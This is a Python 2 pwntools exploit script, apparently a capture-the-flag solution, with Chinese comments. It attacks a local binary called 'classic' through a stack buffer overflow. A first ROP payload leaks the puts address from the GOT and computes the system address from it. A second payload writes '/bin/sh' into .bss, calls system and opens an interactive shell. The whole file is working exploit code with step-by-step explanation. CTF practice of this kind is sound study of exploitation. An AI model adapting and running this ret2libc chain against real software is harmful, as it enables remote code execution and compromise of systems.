# encoding:utf-8
from pwn import *
"""
第一次溢出，获取put函数在内存中地址
通过put在内存中地址与put_libc，计算systeam函数与'/bin/sh'地址
第二次执行main函数并溢出，跳转到systeam函数地址并传入返回地址与参数
"""
# 参考了：http://www.binarysec.top/post/2018-01-25-12.html

# libc.so文件作用是告诉你相对偏移！
libc = ELF('./libc-2.23.so')
put_libc = libc.symbols['puts']
# print "%#x" % put_libc # 0x6f690   就是puts 在 libc 中的偏移！
system_libc = libc.symbols['system']
# print "%#x" % system_libc # 0x6f690   就是puts 在 libc 中的偏移！

puts_plt = 0x400520 

vuln_addr = 0x4006A9 # 这里填写漏洞函数里面汇编第一个地址

poprdi_ret = 0x400753 # pop rdi ; ret


p = process('./classic', env = {'LD_PRELOAD': './libc-2.23.so'})

address = 0x601018 # 需要泄露的地址，是plt这个地址写的 jmp cs:off_601018
payload1 = 'a'*(48+24)+ p64(poprdi_ret) + p64(address) + p64(puts_plt) + p64(vuln_addr)
p.sendline(payload1) # 自动添加\n
print p.recvuntil('Have a nice pwn!!\n')
s = p.recvuntil("\n")
data = s[:8] # 遇到 0a很烦
while len(data) < 8:
    another_address = address + len(data)
    payload1 = 'a'*(48+24)+ p64(poprdi_ret) + p64(another_address) + p64(puts_plt) + p64(vuln_addr)
    p.sendline(payload1) # 自动添加\n
    print p.recvuntil('Have a nice pwn!!\n')
    s = p.recvuntil("\n")
    data += s[:8]
# puts 会把\0忽略转换为0a，并终止，我日
# got 表似乎没有 00 问题

print "%#x => %s" % (address, (data or '').encode('hex'))
# 泄露出地址，然后进行攻击
# 由于libc的延迟绑定机制，我们需要选择已经执行过的函数来进行泄露
# pwndbg> x/1xg 0x400520
# 0x400520 <puts@plt>:    0x006800200af225ff

# libc.so需要和二进制文件在同一个目录吗？

data = data.replace("\n", "\0")
put_addr = u64(data)
print "put_addr: ", hex(put_addr)
system_addr = put_addr - put_libc + system_libc
bss_addr = 0x0601060  # IDA segment ，选择 .bss 的 start 地址

gets_plt = 0x400560
payload2 = 'a'*(48+24) + p64(poprdi_ret) + p64(bss_addr) + p64(gets_plt) + p64(poprdi_ret) + p64(bss_addr) + p64(system_addr) + p64(vuln_addr)

p.recvuntil("Local Buffer >>")
p.sendline(payload2)
p.sendline('/bin/sh\0')
p.interactive() 

